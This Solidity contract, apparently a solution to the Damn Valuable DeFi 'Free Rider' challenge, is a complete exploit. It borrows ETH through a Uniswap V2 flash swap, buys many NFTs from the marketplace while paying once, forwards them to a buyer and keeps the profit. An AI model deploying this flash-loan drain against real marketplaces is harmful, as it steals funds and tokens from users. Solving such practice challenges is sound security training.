// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../DamnValuableNFT.sol';
import './FreeRiderNFTMarketplace.sol';

interface UniV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface WETH {
    function deposit() external payable;

    function withdraw(uint256 wad) external;

    function transfer(address dst, uint256 wad) external returns (bool);
}

/**
 * @title FreeRiderExploiter
 * @author Patate
 */
contract FreeRiderExploiter is IUniswapV2Callee {
    UniV2Pair public immutable ethPair;
    WETH public immutable weth;
    FreeRiderNFTMarketplace public immutable freeRiderNFTMarketplace;
    DamnValuableNFT public immutable nft;
    address public immutable owner;
    address public immutable buyer;

    constructor(
        UniV2Pair _ethPair,
        WETH _weth,
        FreeRiderNFTMarketplace _freeRiderNFTMarketplace,
        DamnValuableNFT _nft,
        address _buyer
    ) {
        ethPair = _ethPair;
        weth = _weth;
        freeRiderNFTMarketplace = _freeRiderNFTMarketplace;
        nft = _nft;
        owner = msg.sender;
        buyer = _buyer;
    }

    function drain(uint256 _nftAmount, uint256 _price) external {
        bytes memory data = abi.encode(_nftAmount, _price);
        ethPair.swap(_price, 0, address(this), data);
    }

    function uniswapV2Call(
        address,
        uint256 amount0,
        uint256,
        bytes calldata data
    ) external override {
        (uint256 nftAmount, uint256 price) = abi.decode(data, (uint256, uint256));
        uint256[] memory tokenIds = new uint256[](nftAmount);

        for (uint256 i = 0; i < nftAmount; i++) {
            tokenIds[i] = i;
        }
        weth.withdraw(amount0);

        freeRiderNFTMarketplace.buyMany{value: price}(tokenIds);

        for (uint256 i = 0; i < nftAmount; i++) {
            nft.safeTransferFrom(address(this), buyer, i);
        }

        // Repaying flash swap
        uint256 repayAmount = (amount0 * 1_000) / 997 + 1;
        weth.deposit{value: repayAmount}();
        weth.transfer(address(ethPair), repayAmount);

        (bool success, ) = owner.call{value: address(this).balance}('');
        require(success);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
